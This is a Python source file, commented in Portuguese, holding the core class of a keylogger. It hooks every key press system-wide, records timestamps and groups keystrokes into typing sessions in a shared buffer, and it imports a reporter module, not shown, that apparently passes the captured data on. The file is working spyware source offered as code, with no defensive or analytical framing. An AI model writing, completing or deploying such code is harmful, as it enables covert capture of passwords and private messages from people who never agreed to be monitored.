import keyboard
import time
import threading
from datetime import datetime
from .buffer_manager import BufferManager
from .reporter import Reporter


class KeyloggerCore:
    """Captura eventos de teclado e os organiza em sessões de digitação."""

    SPECIAL_KEYS = {
        'ctrl': '⌃', 'control': '⌃', 'shift': '⇧', 'alt': '⌥',
        'windows': '⊞', 'esc': '⎋', 'enter': '↵', 'backspace': '⌫',
        'delete': '⌦', 'tab': '⇥', 'caps lock': '⇪', 'space': '␣',
        'up': '↑', 'down': '↓', 'left': '←', 'right': '→',
    }
    TYPING_THRESHOLD = 2.0  # Segundos sem atividade para nova sessão

    def __init__(self, buffer: BufferManager):
        self.buffer = buffer
        self._last_key_time = None
        self._last_session_time = None

    def _format_key(self, key_name: str) -> str:
        return self.SPECIAL_KEYS.get(key_name.lower(), key_name)

    def on_key_event(self, event):
        if event.event_type != keyboard.KEY_DOWN:
            return
        now = time.time()
        ts = datetime.now().strftime('%H:%M:%S')
        formatted = self._format_key(event.name)

        with self.buffer.lock:
            if self._last_key_time and (now - self._last_key_time) > self.TYPING_THRESHOLD:
                if self.buffer.current_session:
                    self.buffer.flush_session(self._last_session_time)
            self.buffer.current_session.append(formatted)
            self._last_key_time = now
            self._last_session_time = ts

    def start(self):
        keyboard.hook(self.on_key_event)
